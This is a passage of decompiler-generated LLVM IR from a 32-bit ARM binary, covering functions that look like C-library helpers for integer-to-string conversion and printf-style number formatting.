  %v0_133dc = load i32, i32* @r1, align 4
  %v1_133dc = inttoptr i32 %v0_133dc to i32*
  %v2_133dc = load i32, i32* %v1_133dc, align 4
  %v2_133e0 = urem i32 %v2_133dc, 256
  %v2_133e0.v2_133dc = select i1 %v7_133d8, i32 %v2_133e0, i32 %v2_133dc
  br i1 %v7_133d8, label %.thread2, label %dec_label_pc_133e8

dec_label_pc_133e8:                               ; preds = %dec_label_pc_133d8
  %v7_133e8 = icmp eq i32 %v0_13390, 512
  br i1 %v7_133e8, label %bb5, label %.thread2

bb5:                                              ; preds = %dec_label_pc_133e8
  %v4_133ec = mul i32 %v2_133e0.v2_133dc, 65536
  %v4_133f0 = sdiv i32 %v4_133ec, 65536
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_133e8, %dec_label_pc_133d8, %bb5
  %v0_133f4 = phi i32 [ %v2_133dc, %dec_label_pc_133e8 ], [ %v2_133e0, %dec_label_pc_133d8 ], [ %v4_133f0, %bb5 ]
  %v3_133f4 = ashr i32 %v0_133f4, 31
  store i32 %v3_133f4, i32* @r1, align 4
  ret i32 %v0_133f4

; uselistorder directives
  uselistorder i32 %v0_133f4, { 1, 0 }
  uselistorder i32 %v2_133e0, { 1, 0 }
  uselistorder i32 %v2_133dc, { 1, 2, 0 }
  uselistorder i32 %v2_133ac, { 1, 0 }
  uselistorder i32 %v2_133a8, { 1, 2, 0 }
  uselistorder i1 %v2_133c8, { 1, 0 }
  uselistorder label %.thread2, { 2, 0, 1 }
  uselistorder label %dec_label_pc_133d0, { 1, 0 }
  uselistorder label %.thread, { 2, 0, 1 }
}

define i32 @function_133fc(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_133fc:
  %cpsr_z.global-to-local = alloca i1, align 1
  %tmp = trunc i32 %arg3 to i16
  %tmp2 = ptrtoint i16* %arg1 to i32
  %v7_133fc = icmp eq i32 %arg2, 256
  store i1 %v7_133fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_133fc, label %bb, label %bb4

bb:                                               ; preds = %dec_label_pc_133fc
  %v3_13400 = trunc i32 %arg3 to i8
  %tmp3 = bitcast i16* %arg1 to i8*
  store i8 %v3_13400, i8* %tmp3, align 1
  %v1_13404.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  br label %bb4

bb4:                                              ; preds = %dec_label_pc_133fc, %bb
  %v1_13404 = phi i1 [ false, %dec_label_pc_133fc ], [ %v1_13404.pre, %bb ]
  %v0_13404 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v1_13404, i32 %v0_13404)
  %v7_13408 = icmp eq i32 %arg2, 2048
  store i1 %v7_13408, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_13408, label %dec_label_pc_13410, label %dec_label_pc_13418

dec_label_pc_13410:                               ; preds = %bb4
  %tmp5 = bitcast i16* %arg1 to i32*
  store i32 %arg3, i32* %tmp5, align 4
  %v5_13410 = add i32 %tmp2, 4
  %v6_13410 = inttoptr i32 %v5_13410 to i32*
  store i32 %arg4, i32* %v6_13410, align 4
  ret i32 %tmp2

dec_label_pc_13418:                               ; preds = %bb4
  %v7_13418 = icmp eq i32 %arg2, 512
  store i1 %v7_13418, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_13418, label %bb6, label %.thread

bb6:                                              ; preds = %dec_label_pc_13418
  store i16 %tmp, i16* %arg1, align 2
  br label %bb8

.thread:                                          ; preds = %dec_label_pc_13418
  %tmp7 = bitcast i16* %arg1 to i32*
  store i32 %arg3, i32* %tmp7, align 4
  br label %bb8

bb8:                                              ; preds = %bb6, %.thread
  ret i32 %tmp2

; uselistorder directives
  uselistorder i16* %arg1, { 3, 2, 1, 0, 4 }
  uselistorder label %bb8, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
}

define i32 @function_13428(i8* %arg1) local_unnamed_addr {
dec_label_pc_13428:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %tmp19 = call i32 @__decompiler_undefined_function_0()
  %v3_13428 = load i32, i32* @r4, align 4
  %v12_13428 = load i32, i32* @r7, align 4
  store i32 %tmp19, i32* @r7, align 4
  %v1_13434 = icmp slt i32 %tmp19, 0
  %v2_13434 = icmp eq i32 %tmp19, 0
  store i1 %v2_13434, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* %r8.global-to-local, align 4
  %v0_1343c = load i32, i32* @r2, align 4
  store i32 %v0_1343c, i32* %r5.global-to-local, align 4
  %v0_13440 = load i32, i32* @r3, align 4
  store i32 %v0_13440, i32* %r6.global-to-local, align 4
  br i1 %v1_13434, label %dec_label_pc_13448, label %dec_label_pc_13468

dec_label_pc_13448:                               ; preds = %dec_label_pc_13428
  %v1_13448 = icmp slt i32 %v0_13440, 0
  %v2_13448 = icmp eq i32 %v0_13440, 0
  store i1 %v2_13448, i1* %cpsr_z.global-to-local, align 1
  %v1_1344c = sub i32 0, %tmp19
  store i32 %v1_1344c, i32* @r7, align 4
  br i1 %v1_13448, label %dec_label_pc_13454, label %dec_label_pc_13468

dec_label_pc_13454:                               ; preds = %dec_label_pc_13448
  %v1_13458 = sub i32 0, %v0_1343c
  store i32 %v1_13458, i32* %r5.global-to-local, align 4
  %v2_13458 = icmp eq i32 %v0_1343c, 0
  %v2_1345c = icmp eq i1 %v2_13458, false
  %v5_1345c = sext i1 %v2_1345c to i32
  %v6_1345c = sub i32 %v5_1345c, %v0_13440
  store i32 %v6_1345c, i32* %r6.global-to-local, align 4
  %v19_1345c = icmp eq i32 %v6_1345c, 0
  store i1 %v19_1345c, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_13470

dec_label_pc_13468:                               ; preds = %dec_label_pc_13448, %dec_label_pc_13428
  br label %dec_label_pc_13470

dec_label_pc_13470:                               ; preds = %dec_label_pc_13454, %dec_label_pc_13468
  %storemerge = phi i8 [ 0, %dec_label_pc_13468 ], [ 1, %dec_label_pc_13454 ]
  store i32 0, i32* %sl.global-to-local, align 4
  store i8 0, i8* %arg1, align 1
  %v0_13478 = load i32, i32* @r7, align 4
  store i32 %v0_13478, i32* @r1, align 4
  store i32 -1, i32* @r0, align 4
  %v0_13480 = call i32 @function_c960()
  %v0_13484 = load i32, i32* @r7, align 4
  store i32 %v0_13480, i32* %fp.global-to-local, align 4
  %v2_13490 = call i32 @function_ca5c(i32 -1, i32 %v0_13484)
  %v1_13494 = add i32 %v0_13484, 1
  store i32 %v1_13494, i32* %sb.global-to-local, align 4
  %v1_13498 = load i32, i32* @r7, align 4
  %v9_13498 = icmp eq i32 %v1_13494, %v1_13498
  store i1 %v9_13498, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_13498, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_13470
  %v1_1349c = load i32, i32* %sl.global-to-local, align 4
  store i32 %v1_1349c, i32* %sb.global-to-local, align 4
  %v1_134a0 = load i32, i32* %fp.global-to-local, align 4
  %v2_134a0 = add i32 %v1_134a0, 1
  store i32 %v2_134a0, i32* %fp.global-to-local, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_13470, %bb
  %v0_134a4 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_134a4, i32* %sl.global-to-local, align 4
  %v0_134a8 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_134a8, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_134ac

dec_label_pc_134acthread-pre-split:               ; preds = %bb23
  %v0_134ac.pr = load i32, i32* %sl.global-to-local, align 4
  %v0_134b0.pre = load i32, i32* %r6.global-to-local, align 4
  %v0_134b4.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_134ac

dec_label_pc_134ac:                               ; preds = %dec_label_pc_134acthread-pre-split, %.thread
  %v0_134b4 = phi i32 [ %v0_134b4.pre, %dec_label_pc_134acthread-pre-split ], [ %v1_13498, %.thread ]
  %v0_134b0 = phi i32 [ %v0_134b0.pre, %dec_label_pc_134acthread-pre-split ], [ %v0_134a8, %.thread ]
  %v0_134bc = phi i32 [ %v0_134ac.pr, %dec_label_pc_134acthread-pre-split ], [ %v0_134a4, %.thread ]
  %v2_134ac = icmp eq i32 %v0_134bc, 0
  store i1 %v2_134ac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_134ac, label %dec_label_pc_13524, label %dec_label_pc_134bc

dec_label_pc_134bc:                               ; preds = %dec_label_pc_134ac
  %v2_134c0 = call i32 @function_ca5c(i32 %v0_134bc, i32 %v0_134b4)
  %v0_134c4 = load i32, i32* %sl.global-to-local, align 4
  store i32 %v0_134c4, i32* @r0, align 4
  store i32 %v0_134b4, i32* @r4, align 4
  %v0_134cc = load i32, i32* @r7, align 4
  store i32 %v0_134cc, i32* @r1, align 4
  %v0_134d0 = call i32 @function_c960()
  %v0_134d4 = load i32, i32* @r7, align 4
  store i32 %v0_134d0, i32* %sl.global-to-local, align 4
  %v0_134dc = load i32, i32* %r6.global-to-local, align 4
  %v2_134e0 = call i32 @function_ca5c(i32 %v0_134dc, i32 %v0_134d4)
  %v0_134e4 = load i32, i32* %sb.global-to-local, align 4
  %v1_134e4 = load i32, i32* @r4, align 4
  %v2_134e4 = mul i32 %v1_134e4, %v0_134e4
  store i32 %v0_134dc, i32* @r0, align 4
  %v2_134ec = add i32 %v2_134e4, %v0_134d4
  store i32 %v2_134ec, i32* %r5.global-to-local, align 4
  %v0_134f0 = load i32, i32* @r7, align 4
  store i32 %v0_134f0, i32* @r1, align 4
  %v0_134f4 = call i32 @function_c960()
  %v0_134f8 = load i32, i32* %fp.global-to-local, align 4
  %v1_134f8 = load i32, i32* @r4, align 4
  %v2_134f8 = mul i32 %v1_134f8, %v0_134f8
  %v0_134fc = load i32, i32* @r7, align 4
  store i32 %v0_134fc, i32* @r1, align 4
  %v2_13500 = add i32 %v2_134f8, %v0_134f4
  store i32 %v2_13500, i32* @r4, align 4
  %v0_13504 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_13504, i32* @r0, align 4
  %v0_13508 = call i32 @function_c960()
  %v0_1350c = load i32, i32* @r7, align 4
  %v0_13510 = load i32, i32* @r4, align 4
  %v2_13510 = add i32 %v0_13510, %v0_13508
  store i32 %v2_13510, i32* %r6.global-to-local, align 4
  %v0_13514 = load i32, i32* %r5.global-to-local, align 4
  %v2_13518 = call i32 @function_ca5c(i32 %v0_13514, i32 %v0_1350c)
  store i32 %v0_1350c, i32* @r4, align 4
  br label %dec_label_pc_1353c

dec_label_pc_13524:                               ; preds = %dec_label_pc_134ac
  %v2_13524 = call i32 @function_ca5c(i32 %v0_134b0, i32 %v0_134b4)
  %v0_13528 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_13528, i32* @r0, align 4
  store i32 %v0_134b4, i32* @r4, align 4
  %v0_13530 = load i32, i32* @r7, align 4
  store i32 %v0_13530, i32* @r1, align 4
  %v0_13534 = call i32 @function_c960()
  store i32 %v0_13534, i32* %r6.global-to-local, align 4
  %v0_13540.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1353c

dec_label_pc_1353c:                               ; preds = %dec_label_pc_134bc, %dec_label_pc_13524
  %v0_13544 = phi i32 [ %v0_1350c, %dec_label_pc_134bc ], [ %v0_13540.pre, %dec_label_pc_13524 ]
  %v2_13540 = icmp ugt i32 %v0_13544, 8
  %v7_13540 = icmp eq i32 %v0_13544, 9
  store i1 %v7_13540, i1* %cpsr_z.global-to-local, align 1
  %v1_13548 = add i32 %v0_13544, 48
  %v0_13550 = load i32, i32* %r8.global-to-local, align 4
  %v1_13550 = add i32 %v0_13550, -1
  store i32 %v1_13550, i32* %r8.global-to-local, align 4
  %v2_13554 = xor i1 %v7_13540, true
  %v3_13554 = and i1 %v2_13540, %v2_13554
  %extract.t = trunc i32 %v1_13548 to i8
  br i1 %v3_13554, label %bb22, label %bb23

bb22:                                             ; preds = %dec_label_pc_1353c
  %v2_13544 = add i32 %v0_13544, %tmp9
  %extract.t7 = trunc i32 %v2_13544 to i8
  br label %bb23

bb23:                                             ; preds = %dec_label_pc_1353c, %bb22
  %v0_1355c.off0 = phi i8 [ %extract.t, %dec_label_pc_1353c ], [ %extract.t7, %bb22 ]
  %v0_13558 = load i32, i32* %r6.global-to-local, align 4
  %v1_13558 = load i32, i32* %sl.global-to-local, align 4
  %v2_13558 = or i32 %v1_13558, %v0_13558
  %v4_13558 = icmp eq i32 %v2_13558, 0
  store i1 %v4_13558, i1* %cpsr_z.global-to-local, align 1
  %v3_1355c = inttoptr i32 %v1_13550 to i8*
  store i8 %v0_1355c.off0, i8* %v3_1355c, align 1
  %v0_13560 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_13560, label %dec_label_pc_13564, label %dec_label_pc_134acthread-pre-split

dec_label_pc_13564:                               ; preds = %bb23
  %v4_135648 = zext i8 %storemerge to i32
  store i32 %v4_135648, i32* @r3, align 4
  %v2_13568 = icmp eq i8 %storemerge, 0
  store i1 %v2_13568, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13568, label %dec_label_pc_13564..thread2_crit_edge, label %bb24

dec_label_pc_13564..thread2_crit_edge:            ; preds = %dec_label_pc_13564
  %v0_13574.pre = load i32, i32* %r8.global-to-local, align 4
  br label %.thread2

bb24:                                             ; preds = %dec_label_pc_13564
  store i32 45, i32* @r3, align 4
  %v3_13570 = load i32, i32* %r8.global-to-local, align 4
  %v4_13570 = add i32 %v3_13570, -1
  %v5_13570 = inttoptr i32 %v4_13570 to i8*
  store i8 45, i8* %v5_13570, align 1
  %v6_13570 = load i32, i32* %r8.global-to-local, align 4
  %v7_13570 = add i32 %v6_13570, -1
  store i32 %v7_13570, i32* %r8.global-to-local, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_13564..thread2_crit_edge, %bb24
  %v0_13574 = phi i32 [ %v0_13574.pre, %dec_label_pc_13564..thread2_crit_edge ], [ %v7_13570, %bb24 ]
  store i32 %v3_13428, i32* @r4, align 4
  store i32 %v12_13428, i32* @r7, align 4
  ret i32 %v0_13574

; uselistorder directives
  uselistorder i32 %v0_1350c, { 0, 2, 1 }
  uselistorder i32 %v0_134b4, { 2, 3, 0, 1 }
  uselistorder i8 %storemerge, { 1, 0 }
  uselistorder i32 %v0_1343c, { 1, 0, 2 }
  uselistorder i32 %tmp19, { 0, 3, 2, 1 }
  uselistorder i32* %sl.global-to-local, { 2, 0, 3, 1, 4, 5, 6 }
  uselistorder i32* %sb.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r6.global-to-local, { 2, 0, 5, 3, 4, 1, 6, 8, 7, 9 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32* %fp.global-to-local, { 1, 0, 2, 3 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %bb23, { 1, 0 }
  uselistorder label %dec_label_pc_1353c, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_13470, { 1, 0 }
}

define i32 @function_13584(i32 %arg1, i32 %arg2, i32 %arg3, i32* %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_13584:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_0 = alloca i32, align 4
  %tmp182 = ptrtoint i32* %arg4 to i32
  store i32 %tmp182, i32* %stack_var_0, align 4
  %stack_var_-46 = alloca i8, align 1
  %stack_var_-164 = alloca i32, align 4
  %stack_var_-47 = alloca i32, align 4
  %stack_var_-132 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-180 = alloca i32, align 4
  %stack_var_-42 = alloca i32, align 4
  %stack_var_-82 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-83 = alloca i32, align 4
  %stack_var_-81 = alloca i32, align 4
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-208 = alloca i32, align 4
  %v3_13584 = load i32, i32* @r4, align 4
  %v6_13584 = load i32, i32* @r5, align 4
  %v9_13584 = load i32, i32* @r6, align 4
  %v12_13584 = load i32, i32* @r7, align 4
  %v27_13584 = load i32, i32* @lr, align 4
  store i32 %tmp182, i32* %r1.global-to-local, align 4
  %v1_13590 = add i32 %tmp182, 8
  %v2_13590 = inttoptr i32 %v1_13590 to i8*
  %v3_13590 = load i8, i8* %v2_13590, align 1
  %v4_13590 = zext i8 %v3_13590 to i32
  store i32 %v4_13590, i32* %sb.global-to-local, align 4
  %v1_13594 = or i32 %v4_13590, 32
  %v7_13598 = icmp eq i32 %v1_13594, 97
  store i1 %v7_13598, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp182, i32* %r0.global-to-local, align 4
  store i32 %tmp182, i32* %r1.global-to-local, align 4
  %v2_135b0 = load i32, i32* %arg4, align 4
  store i32 %v2_135b0, i32* %fp.global-to-local, align 4
  store i32 %tmp182, i32* %lr.global-to-local, align 4
  %v0_135b8 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_135b8, i32* @r6, align 4
  store i32 ptrtoint (i32* @global_var_f4f8.583 to i32), i32* %ip.global-to-local, align 4
  br i1 %v7_13598, label %bb, label %bb197

bb:                                               ; preds = %dec_label_pc_13584
  %v2_135c0 = add nuw nsw i32 %v4_13590, 6
  store i32 %v2_135c0, i32* %r3.global-to-local, align 4
  br label %bb197

bb197:                                            ; preds = %dec_label_pc_13584, %bb
  %v1_135d0 = phi i32 [ %v0_135b8, %dec_label_pc_13584 ], [ %v2_135c0, %bb ]
  store i32 %arg2, i32* @r5, align 4
  %v1_135c8 = add i32 %tmp182, 12
  %v2_135c8 = inttoptr i32 %v1_135c8 to i32*
  %v3_135c8 = load i32, i32* %v2_135c8, align 4
  store i32 %v3_135c8, i32* %r2.global-to-local, align 4
  %v1_135cc = add i32 %tmp182, 4
  %v2_135cc = inttoptr i32 %v1_135cc to i32*
  %v3_135cc = load i32, i32* %v2_135cc, align 4
  store i32 %v3_135cc, i32* @lr, align 4
  br i1 %v7_13598, label %bb198, label %bb199

bb198:                                            ; preds = %bb197
  %v2_135d0 = urem i32 %v1_135d0, 256
  store i32 %v2_135d0, i32* %sb.global-to-local, align 4
  br label %bb199

bb199:                                            ; preds = %bb197, %bb198
  %v1_135d4 = icmp slt i32 %v2_135b0, 0
  %v2_135d4 = icmp eq i32 %v2_135b0, 0
  store i1 %v2_135d4, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_f4f8.583 to i32), i32 79332), i32* %ip.global-to-local, align 4
  br i1 %v1_135d4, label %bb200, label %bb201

bb200:                                            ; preds = %bb199
  store i32 6, i32* %fp.global-to-local, align 4
  br label %bb201

bb201:                                            ; preds = %bb199, %bb200
  %v1_135e4 = and i32 %v3_135c8, 2
  %v2_135e4 = icmp eq i32 %v1_135e4, 0
  store i1 %v2_135e4, i1* %cpsr_z.global-to-local, align 1
  store i8 0, i8* %stack_var_-46, align 1
  br i1 %v2_135e4, label %dec_label_pc_135fc, label %dec_label_pc_13608

dec_label_pc_135fc:                               ; preds = %bb201
  %v1_135fc = urem i32 %v3_135c8, 2
  %v2_135fc = icmp eq i32 %v1_135fc, 0
  store i1 %v2_135fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_135fc, label %dec_label_pc_1360c, label %dec_label_pc_13608

dec_label_pc_13608:                               ; preds = %dec_label_pc_135fc, %bb201
  %storemerge = phi i32 [ 43, %bb201 ], [ 32, %dec_label_pc_135fc ]
  %v0_13608.off0 = phi i8 [ 43, %bb201 ], [ 32, %dec_label_pc_135fc ]
  store i32 %storemerge, i32* %r3.global-to-local, align 4
  store i8 %v0_13608.off0, i8* %stack_var_-46, align 1
  br label %dec_label_pc_1360c

dec_label_pc_1360c:                               ; preds = %dec_label_pc_135fc, %dec_label_pc_13608
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 %v0_135b8, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* @r0, align 4
  store i32 %v0_135b8, i32* %r1.global-to-local, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %v5_13628 = call i32 @function_18444(i32 %arg2, i32 %v0_135b8, i32 %arg2, i32 %v0_135b8, i32 0)
  store i32 %v5_13628, i32* %r0.global-to-local, align 4
  %v2_1362c = icmp eq i32 %v5_13628, 0
  store i1 %v2_1362c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1362c, label %bb203, label %dec_label_pc_1363c

bb203:                                            ; preds = %dec_label_pc_1360c
  store i32 8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_136f0

dec_label_pc_1363c:                               ; preds = %dec_label_pc_1360c
  %v0_1363c = load i32, i32* @r5, align 4
  store i32 %v0_1363c, i32* @r0, align 4
  %v0_13640 = load i32, i32* @r6, align 4
  store i32 %v0_13640, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v5_1364c = call i32 @function_18444(i32 %v0_1363c, i32 %v0_13640, i32 0, i32 0, i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_1364c, i32* %r0.global-to-local, align 4
  %v2_13650 = icmp eq i32 %v5_1364c, 0
  store i1 %v2_13650, i1* %cpsr_z.global-to-local, align 1
  %v0_13698 = load i32, i32* @r5, align 4
  br i1 %v2_13650, label %dec_label_pc_13698, label %dec_label_pc_13658

dec_label_pc_13658:                               ; preds = %dec_label_pc_1363c
  store i32 %v0_13698, i32* %r2.global-to-local, align 4
  %v0_1365c = load i32, i32* @r6, align 4
  store i32 %v0_1365c, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 1072693248, i32* %r1.global-to-local, align 4
  %v4_13668 = call i32 @function_18170(i32 0, i32 1072693248, i32 %v0_13698, i32 %v0_1365c)
  store i32 %v4_13668, i32* @r0, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_13674 = call i32 @function_1845c(i32 %v4_13668)
  store i32 %v1_13674, i32* %r0.global-to-local, align 4
  %v2_13678 = icmp eq i32 %v1_13674, 0
  store i1 %v2_13678, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13678, label %bb204, label %dec_label_pc_13684

bb204:                                            ; preds = %dec_label_pc_13658
  store i32 -1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13864

dec_label_pc_13684:                               ; preds = %dec_label_pc_13658
  store i32 45, i32* %r3.global-to-local, align 4
  store i8 45, i8* %stack_var_-46, align 1
  br label %dec_label_pc_13864

dec_label_pc_13698:                               ; preds = %dec_label_pc_1363c
  store i32 %v0_13698, i32* @r0, align 4
  %v0_1369c = load i32, i32* @r6, align 4
  store i32 %v0_1369c, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v4_136a8 = call i32 @function_1845c(i32 %v0_13698)
  store i32 %v4_136a8, i32* %r0.global-to-local, align 4
  %v2_136ac = icmp eq i32 %v4_136a8, 0
  store i1 %v2_136ac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_136ac, label %dec_label_pc_13698..thread9_crit_edge, label %bb205

dec_label_pc_13698..thread9_crit_edge:            ; preds = %dec_label_pc_13698
  %v0_136cc.pre = load i32, i32* @r6, align 4
  br label %.thread9

bb205:                                            ; preds = %dec_label_pc_13698
  store i32 45, i32* %r2.global-to-local, align 4
  %v1_136b4 = load i32, i32* @r6, align 4
  %v2_136b4 = sub i32 0, %v1_136b4
  store i32 %v2_136b4, i32* @r4, align 4
  store i8 45, i8* %stack_var_-46, align 1
  store i32 %v2_136b4, i32* @r6, align 4
  br label %.thread9

.thread9:                                         ; preds = %dec_label_pc_13698..thread9_crit_edge, %bb205
  %v0_136cc = phi i32 [ %v0_136cc.pre, %dec_label_pc_13698..thread9_crit_edge ], [ %v2_136b4, %bb205 ]
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 1070596096, i32* %r3.global-to-local, align 4
  %v0_136c8 = load i32, i32* @r5, align 4
  store i32 %v0_136c8, i32* %r0.global-to-local, align 4
  store i32 %v0_136cc, i32* %r1.global-to-local, align 4
  %v4_136d0 = sext i32 %v0_136c8 to i64
  %v5_136d0 = call i32 @function_17ee0(i64 %v4_136d0, i32 %v0_136cc, i32 0, i32 1070596096)
  store i32 %v5_136d0, i32* %r2.global-to-local, align 4
  store i32 %v0_136cc, i32* %r3.global-to-local, align 4
  %v0_136dc = load i32, i32* @r5, align 4
  store i32 %v0_136dc, i32* @r0, align 4
  %v0_136e0 = load i32, i32* @r6, align 4
  store i32 %v0_136e0, i32* %r1.global-to-local, align 4
  %v5_136e4 = call i32 @function_18444(i32 %v0_136dc, i32 %v0_136e0, i32 %v5_136d0, i32 %v0_136cc, i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_136e4, i32* %r0.global-to-local, align 4
  %v2_136e8 = icmp eq i32 %v5_136e4, 0
  store i1 %v2_136e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_136e8, label %dec_label_pc_1373c, label %.thread9.dec_label_pc_136f0_crit_edge

.thread9.dec_label_pc_136f0_crit_edge:            ; preds = %.thread9
  %v3_136f0.pre = load i32, i32* %stack_var_0, align 4
  br label %dec_label_pc_136f0

dec_label_pc_136f0:                               ; preds = %bb203, %.thread9.dec_label_pc_136f0_crit_edge
  %v3_136f0 = phi i32 [ %v3_136f0.pre, %.thread9.dec_label_pc_136f0_crit_edge ], [ %tmp182, %bb203 ]
  %v1_13634.v0_136205 = phi i32 [ 0, %.thread9.dec_label_pc_136f0_crit_edge ], [ 8, %bb203 ]
  store i32 %v3_136f0, i32* %ip.global-to-local, align 4
  %v2_136f8 = add i32 %v3_136f0, 16
  %v3_136f8 = inttoptr i32 %v2_136f8 to i32*
  store i32 32, i32* %v3_136f8, align 4
  %v0_13700 = load i32, i32* %sb.global-to-local, align 4
  %v7_13700 = icmp eq i32 %v0_13700, 96
  store i1 %v7_13700, i1* %cpsr_z.global-to-local, align 1
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 3, i32* %stack_var_-164, align 4
  %tmp = icmp ult i32 %v0_13700, 97
  br i1 %tmp, label %bb206, label %.thread121

bb206:                                            ; preds = %dec_label_pc_136f0
  %v5_13714 = or i32 %v1_13634.v0_136205, 4
  store i32 %v5_13714, i32* %r3.global-to-local, align 4
  br label %.thread121

.thread121:                                       ; preds = %dec_label_pc_136f0, %bb206
  %v4_13718 = phi i32 [ %v5_13714, %bb206 ], [ 3, %dec_label_pc_136f0 ]
  %v4_13718.v1_13634.v0_13620 = select i1 %tmp, i32 %v4_13718, i32 %v1_13634.v0_136205
  store i32 add (i32 ptrtoint (i32* @global_var_f4f8.583 to i32), i32 79332), i32* %lr.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1a9c0.587 to i32), i32* %r3.global-to-local, align 4
  %v2_1372c = add i32 %v4_13718.v1_13634.v0_13620, ptrtoint ([4 x i8]* @global_var_1a9c0.587 to i32)
  store i32 %v2_1372c, i32* %r2.global-to-local, align 4
  %v2_13730 = ptrtoint i32* %stack_var_-156 to i32
  store i32 %v2_13730, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_13c58

dec_label_pc_1373c:                               ; preds = %.thread9
  %v0_1373c = load i32, i32* @r6, align 4
  store i32 %v0_1373c, i32* %r1.global-to-local, align 4
  store i32 1100470148, i32* %r3.global-to-local, align 4
  %v0_13744 = load i32, i32* @r5, align 4
  store i32 %v0_13744, i32* @r0, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v4_1374c = call i32 @function_1845c(i32 %v0_13744)
  store i32 %v4_1374c, i32* %r0.global-to-local, align 4
  %v2_13750 = icmp eq i32 %v4_1374c, 0
  store i1 %v2_13750, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13750, label %bb208, label %bb207

bb207:                                            ; preds = %dec_label_pc_1373c
  store i32 1, i32* %r0.global-to-local, align 4
  br label %bb208

bb208:                                            ; preds = %dec_label_pc_1373c, %bb207
  %v0_13758 = phi i32 [ 0, %dec_label_pc_1373c ], [ 1, %bb207 ]
  store i32 add (i32 ptrtoint (i32* @global_var_f4f8.583 to i32), i32 79332), i32* %r0.global-to-local, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1a9d8.590 to i32), i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1a9d8.590 to i32), i32* %stack_var_-208, align 4
  store i32 9, i32* %sl.global-to-local, align 4
  store i32 256, i32* @r4, align 4
  %v2_1378c = icmp eq i32 %v0_13758, 0
